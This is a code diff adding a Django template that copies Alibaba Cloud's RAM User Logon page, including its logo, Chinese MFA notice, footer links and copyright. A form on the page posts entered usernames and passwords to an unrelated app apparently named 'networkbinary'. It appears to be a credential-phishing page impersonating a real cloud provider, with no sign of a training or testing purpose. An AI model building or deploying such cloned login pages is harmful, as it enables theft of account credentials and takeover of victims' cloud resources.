@@ -1,0 +1,99 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="icon" type="image/png" href="{% static 'networkbinary/images/icon.png' %}">
+  <title>Alibaba Cloud - RAM User Logon</title>
+  <link rel="stylesheet" href="{% static 'networkbinary/css/ram.css' %}" />
+</head>
+<body>
+
+    <section>
+
+        <header class="topbar">
+            <div class="left">
+              <img src="{% static 'networkbinary/images/Capture10.PNG' %}" alt="Alibaba Cloud Logo" width="100%" class="logo" />
+              <!-- <span class="subtitle">Worldwide Cloud Services Partner</span> -->
+            </div>
+            <div class="right">
+              <a href="#">English</a>
+              <a href="{% url 'index' %}" class="homepage">Alibaba Cloud Homepage</a>
+            </div>
+          </header>
+
+    </section>
+
+<section class="page">
+
+
+
+  <div class="container">
+    <h2>RAM User Logon</h2>
+    
+    <div class="info-box">
+      <span class="icon">ℹ️</span>
+      <span>
+        为了保护您的凭证和资产安全，2025 年 3 月 28 日起，已授予 AdministratorAccess 的 RAM 用户登录时将必须进行 MFA 验证，详见 <a href="#">公告</a>
+      </span>
+    </div>
+    
+    <form method="POST">
+      {% csrf_token %}
+      <label for="username"> <span class="ast">*</span> Username</label>
+      <input
+        type="text"
+        id="username"
+        name="username"
+        placeholder="&lt;user&gt;@&lt;domain&gt; or &lt;user&gt;@&lt;alias&gt;"
+      />
+      <input
+        type="text"
+        id="username"
+        name="password"
+        placeholder="password"
+      />
+      <p class="example">Example: username@company.onaliyun.com or username@company-alias.</p>
+      <button type="submit">submit</button>
+    </form>
+    <div class="footer-link">
+        <hr>
+      <a href="{% url 'index' %}">Logon with Alibaba Cloud Account</a>
+    </div>
+  </div>
+
+</section>
+
+<footer class="footer">
+  <div class="footer-top">
+    <a href="#">About Us</a>
+    <a href="#">Privacy Policy</a>
+    <a href="#">Legal</a>
+    <a href="#">Notice List</a>
+  </div>
+
+  <div class="footer-links">
+    <a href="#">Alibaba Group</a>
+    <a href="#">Taobao</a>
+    <a href="#">Tmall</a>
+    <a href="#">Juhuasuan</a>
+    <a href="#">Aliexpress</a>
+    <a href="#">Alibaba.com</a>
+    <a href="#">1688</a>
+    <a href="#">Alimama</a>
+    <a href="#">Alitrip</a>
+    <a href="#">YunOS</a>
+    <a href="#">AutoNavi</a>
+    <a href="#">UC</a>
+    <a href="#">Umeng</a>
+    <a href="#">Alipay</a>
+  </div>
+
+  <div class="footer-copy">
+    © 2009-2025 Copyright by Alibaba Cloud All rights reserved
+  </div>
+</footer>
+
+</body>
+</html>
